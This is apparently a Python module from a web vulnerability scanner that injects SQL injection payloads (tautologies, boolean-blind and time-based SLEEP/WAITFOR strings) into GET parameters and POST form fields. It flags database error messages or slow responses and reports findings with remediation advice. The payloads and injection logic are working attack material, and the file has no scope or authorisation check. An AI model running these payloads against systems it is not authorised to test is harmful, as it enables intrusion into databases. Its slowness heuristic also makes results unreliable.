import re
import urllib.parse
import time

def sqli_payloads(base_payloads=None):
    """
    Generate SQL injection payloads including:
    - classic tautologies
    - boolean-based blind
    - time-based (lightweight, optional)
    """
    if base_payloads is None:
        base_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "' OR ''='",
        ]

    out = list(base_payloads)

    
    blind_payloads = [
        "' AND '1'='1",
        "' AND '1'='2",
        "\" AND \"1\"=\"1",
        "\" AND \"1\"=\"2",
        "' OR 1=1#",
        "' OR 1=2#",
    ]
    out.extend(blind_payloads)

   
    time_payloads = [
        "' OR SLEEP(2)--",
        "\" OR SLEEP(2)--",
        "'; WAITFOR DELAY '0:0:2'--",
    ]
    out.extend(time_payloads)

    
    seen = set()
    res = []
    for p in out:
        if p not in seen:
            seen.add(p)
            res.append(p)
    return res


class SQLiCheck:
    """SQL Injection vulnerability checker."""

    SQLI_PAYLOADS = sqli_payloads()

    ERROR_PATTERNS = [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning.*mysql", re.I),
        re.compile(r"unclosed quotation mark after the character string", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"syntax error.*sql", re.I),
        re.compile(r"mysql_fetch", re.I),
        re.compile(r"ORA-\d+", re.I),
        re.compile(r"SQLITE_ERROR", re.I),
    ]

    @classmethod
    def run(cls, http, params_map):
        """Test GET parameters for SQLi vulnerabilities."""
        findings = []

        for url, param_names in params_map.items():
            for param in param_names:
                findings.extend(cls._test_parameter(http, url, param))

        return findings

    @classmethod
    def run_forms(cls, http, forms):
        """Test POST forms for SQLi vulnerabilities."""
        findings = []

        for form in forms:
            if form["method"].upper() == "POST":
                findings.extend(cls._test_form(http, form))

        return findings

    @classmethod
    def _test_parameter(cls, http, url, param_name):
        """Test a specific GET parameter for SQLi."""
        findings = []

        for payload in cls.SQLI_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed.query)

                query_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)

                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                start = time.time()
                response = http.get(test_url)
                elapsed = time.time() - start

                if cls._is_vulnerable(response, elapsed):
                    findings.append({
                        "type": "SQL Injection (GET)",
                        "severity": "CRITICAL",
                        "url": test_url,
                        "parameter": param_name,
                        "payload": payload,
                        "evidence": cls._extract_evidence(response.text),
                        "description": f"SQL Injection vulnerability found in parameter '{param_name}'. "
                                     f"The application directly includes user input in SQL queries.",
                        "recommendation": "Use parameterized queries (prepared statements), input validation, "
                                       "and proper escaping to prevent SQL injection."
                    })
                    break

            except Exception:
                continue

        return findings

    @classmethod
    def _test_form(cls, http, form):
        """Test a POST form for SQLi vulnerabilities."""
        findings = []

        for input_field in form["inputs"]:
            if input_field["hidden"]:
                continue

            param_name = input_field["name"]

            for payload in cls.SQLI_PAYLOADS:
                try:
                    data = {}
                    for inp in form["inputs"]:
                        if inp["name"] == param_name:
                            data[inp["name"]] = payload
                        else:
                            data[inp["name"]] = inp["value"]

                    start = time.time()
                    response = http.post(form["action"], data=data)
                    elapsed = time.time() - start

                    if cls._is_vulnerable(response, elapsed):
                        findings.append({
                            "type": "SQL Injection (POST)",
                            "severity": "CRITICAL",
                            "url": form["action"],
                            "form_page": form["page"],
                            "parameter": param_name,
                            "payload": payload,
                            "evidence": cls._extract_evidence(response.text),
                            "description": f"SQL Injection vulnerability found in form parameter '{param_name}'. "
                                         f"The application directly includes user input in SQL queries.",
                            "recommendation": "Use parameterized queries (prepared statements), input validation, "
                                           "and proper escaping to prevent SQL injection."
                        })
                        break

                except Exception:
                    continue

        return findings

    @classmethod
    def _is_vulnerable(cls, response, elapsed=0):
        """Check if response indicates SQLi vulnerability."""
        if not response or not response.text:
            return False

        for pattern in cls.ERROR_PATTERNS:
            if pattern.search(response.text):
                return True

        
        if elapsed > 1.5: 
            return True

        return False

    @classmethod
    def _extract_evidence(cls, response_text):
        """Extract relevant evidence from response."""
        if not response_text:
            return "No response text"

        for pattern in cls.ERROR_PATTERNS:
            match = pattern.search(response_text)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end].strip()

        lines = response_text.split('\n')
        for line in lines:
            if any(word in line.lower() for word in ["sql", "mysql", "syntax", "error"]):
                return line.strip()[:200]

        return "Potential SQL Injection vulnerability detected"
